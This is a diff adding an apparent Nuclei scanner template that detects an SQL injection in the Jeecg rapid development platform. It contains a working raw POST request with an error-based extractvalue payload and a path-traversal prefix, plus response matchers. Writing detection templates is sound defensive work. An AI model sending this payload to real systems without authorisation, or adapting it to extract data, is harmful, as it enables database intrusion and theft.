@@ -1,0 +1,29 @@
+id: jeecg-sql-injection
+info:
+  name: Jeecg micro cloud rapid development platform SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jeecg (J2EE code generation) is an intelligent development platform based on a code generator. A SQL injection vulnerability exists in the application, which can be exploited by an attacker to obtain sensitive database information.
+  tags: sql-injection
+  reference:
+    - https://fofa.so/
+http:
+  - raw:
+      - |
+        POST /api/../cgAutoListController.do?datagrid&configId=jform_contact&field=extractvalue(1,concat(char(126),md5(0624))) HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+
+        page=1&rows=10&sort=create_date&order=desc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "48ab2f9b45957ab574cf005eb8a7676"
+        part: body
